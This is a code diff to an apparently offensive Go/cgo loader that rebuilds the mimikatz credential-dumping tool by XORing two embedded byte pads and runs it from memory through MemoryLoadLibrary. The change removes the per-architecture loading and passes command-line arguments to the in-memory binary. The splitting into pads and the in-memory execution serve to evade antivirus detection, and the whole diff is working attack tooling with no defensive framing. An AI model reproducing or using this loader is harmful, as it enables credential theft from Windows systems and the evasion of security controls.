@@ -9,7 +9,6 @@ import "C"
 
 import (
 	"os"
-	"runtime"
 	"unsafe"
 )
 
@@ -20,38 +19,38 @@ var (
 )
 
 func main() {
-	// load mimikatz
-	if runtime.GOARCH == "amd64" {
-		mimikatzPad0, err = Asset("mimikatz64.exe.0.pad")
-		if err != nil {
-			os.Exit(0)
-		}
-		mimikatzPad1, err = Asset("mimikatz64.exe.1.pad")
-		if err != nil {
-			os.Exit(0)
-		}
-	} else { // assume GOARCH 386
-		mimikatzPad0, err = Asset("mimikatz32.exe.0.pad")
-		if err != nil {
-			os.Exit(0)
-		}
-		mimikatzPad1, err = Asset("mimikatz32.exe.1.pad")
-		if err != nil {
-			os.Exit(0)
-		}
-
+	// load mimikatz pads
+	mimikatzPad0, err = Asset("mimikatz.exe.0.pad")
+	if err != nil {
+		panic(err)
 	}
+	mimikatzPad1, err = Asset("mimikatz.exe.1.pad")
+	if err != nil {
+		panic(err)
+	}
+
+	// XOR the pads togeather
 	var mimikatzEXE []byte
 	for index, bite := range mimikatzPad0 {
 		mimikatzEXE = append(mimikatzEXE, []byte{bite ^ mimikatzPad1[index]}...)
 	}
-	handle := C.MemoryLoadLibrary(unsafe.Pointer(&mimikatzEXE[0]))
+
+	// convert the args passed to this program into a C array of C strings
+	var cArgs []*C.char
+	for _, goString := range os.Args {
+		cArgs = append(cArgs, C.CString(goString))
+	}
+
+	// load the mimikatz reconstructed binary from memory
+	handle := C.MemoryLoadLibrary(unsafe.Pointer(&mimikatzEXE[0]), &cArgs[0])
 	if handle == nil {
 		print("MemoryLoadLibrary failed")
 		os.Exit(1)
 	}
 
 	// run mimikatz
-	output := C.MemoryCallEntryPoint(handle)
+	C.MemoryCallEntryPoint(handle)
+
+	// cleanup
 	C.MemoryFreeLibrary(handle)
 }
